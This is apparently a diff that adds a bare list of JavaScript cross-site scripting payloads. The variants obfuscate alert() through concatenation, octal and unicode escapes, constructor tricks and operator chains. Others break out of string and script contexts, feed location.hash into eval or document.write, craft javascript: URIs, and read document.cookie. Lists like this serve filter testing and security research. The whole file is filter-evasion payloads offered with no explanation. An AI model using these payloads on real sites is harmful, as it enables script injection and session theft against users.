@@ -1,0 +1,89 @@
+eval('ale' + 'rt(0)');
+Function("ale" + "rt(1)")();
+`al\ert\`6\``;
+setTimeout('ale' + 'rt(2)');
+setInterval('ale' + 'rt(10)');
+Set.constructor('ale' + 'rt(13)')();
+Set.constructor
+`al\x65rt\x2814\x29```;
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
+'te' * alert('*') * 'xt';
+'te' / alert('/') / 'xt';
+'te' % alert('%') % 'xt';
+'te' - alert('-') - 'xt';
+'te' + alert('+') + 'xt';
+'te' ^ alert('^') ^ 'xt';
+'te' > alert('>') > 'xt';
+'te' < alert('<') < 'xt';
+'te' == alert('==') == 'xt';
+'te' & alert('&') & 'xt';
+'te', alert(','), 'xt';
+'te' | alert('|') | 'xt';
+'te' ? alert('ifelsesh'): 'xt';
+'te' in alert('in') in 'xt';
+'te'instanceofalert('instanceof')instanceof'xt';
+\'-alert()//
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top[“al”+”ert”](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top[‘al\145rt’](1)
+top[‘al\x65rt’](1)
+top[8680439..toString(30)](1)
+'-alert(1)-'
+'/alert(1)//
+\'/alert(1)//
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+/alert(1)//\
+/alert(1)}//\
+${alert(1)}
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+[clickme](javascript:alert`1`)
+';alert(1);var myObj='
+';alert(1);function myFunc(){}'
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()
+write`XSSed!`
+write`<img/src/o&#78error=alert&lpar;1)&gt;`
+write('\74img/src/o\156error\75alert\501\51\76')
+top.open`javas\cript:al\ert\x281\x29`
+top.open`javas\cript:al\ert\x281\x29${0}0`
+eval(URL.slice(-8)) #alert(1)
+eval(location.hash.slice(1)) #alert(1)
+document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
+">'-alert(1)-'<svg>
+">&#39-alert(1)-&#39<svg>
+">alert(1)-"<svg>
+"&#34>alert(1)-&#34<svg>
+javascript://%250Aalert(1)
+javascript://%250Aalert(1)//?1
+javascript://%250A1?alert(1):0
+';onerror=alert;throw 1//
+alert(document.cookie)
+alert(document['cookie'])
+with(document)alert(cookie)
+a="get";
+b="URL(\"";
+c="javascript:";
+d="alert('XSS');\")";
+eval(a+b+c+d);
